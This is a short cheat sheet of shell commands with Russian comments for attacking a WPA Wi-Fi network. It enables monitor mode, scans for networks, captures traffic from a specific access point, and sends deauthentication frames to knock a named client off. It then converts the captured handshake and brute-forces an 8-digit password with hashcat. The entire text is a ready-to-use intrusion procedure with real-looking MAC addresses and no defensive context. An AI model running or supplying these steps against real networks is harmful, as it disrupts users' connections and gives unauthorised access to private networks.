# WIFI
# wifi

Ту же информацию о чипсете и драйвере можем посмотреть с помощью утилиты airmon-ng.

sudo systemctl stop NetworkManager
sudo airmon-ng check kill

sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

iw dev

# режим монитора

sudo airmon-ng check kill
sudo airmon-ng start wlan1

# скан всех сетй 

sudo airodump-ng wlan1 

# прослушивание конкретной сети

sudo airodump-ng --bssid C4:6E:1F:71:EC:16 --channel 1 -w test wlan1

# деауз

sudo aireplay-ng --deauth 10 -a C4:6E:1F:71:EC:16 -c 32:B8:F4:5F:FB:65 wlan1

sudo airmon-ng stop wlan1
sudo systemctl restart NetworkManager


hcxpcapngtool -o hash.hc22000 test-01.cap

hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
